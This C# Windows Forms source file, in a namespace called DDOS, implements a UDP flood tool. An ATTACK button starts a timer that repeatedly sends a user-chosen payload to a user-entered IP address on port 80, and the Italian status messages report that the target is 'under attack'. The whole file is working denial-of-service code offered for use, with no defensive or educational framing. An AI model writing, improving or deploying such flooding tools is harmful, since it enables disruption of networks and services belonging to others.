using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace DDOS
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void ATTACK_BTN_Click(object sender, EventArgs e)
        {
            floodTimer.Start();
            Flood();
        }

        private void STOP_BTN_Click(object sender, EventArgs e)
        {
            CONFIRM.Text = "Connessione interrotta";
            floodTimer.Stop();
        }

        private void TXT_IP_TextChanged(object sender, EventArgs e)
        {

        }

        private void Timer1_Tick(object sender, EventArgs e)
        {

        }

        public void Flood()
        {
            UdpClient udpClient = new UdpClient();
            IPAddress ipAddress = IPAddress.Parse(TXT_IP.Text);
            try
            {

                udpClient.Connect(ipAddress, 80);
                byte[] sendBytes = Encoding.ASCII.GetBytes(TXT_CONFIRM.Text);
                udpClient.Send(sendBytes, sendBytes.Length);
                udpClient.AllowNatTraversal(true);
                udpClient.DontFragment = true;
                CONFIRM.Text = TXT_IP.Text + " e' sotto attacco";
            }
            catch (Exception)
            {
                CONFIRM.Text = "Connessione non effettuata verso: " + TXT_IP.ToString();
            }
        }

        private void TXT_CONFIRM_TextChanged(object sender, EventArgs e)
        {

        }

        private void CONFIRM_TextChanged(object sender, EventArgs e)
        {

        }

        private void FloodTimer_Tick(object sender, EventArgs e)
        {
            Flood();
        }
    }
}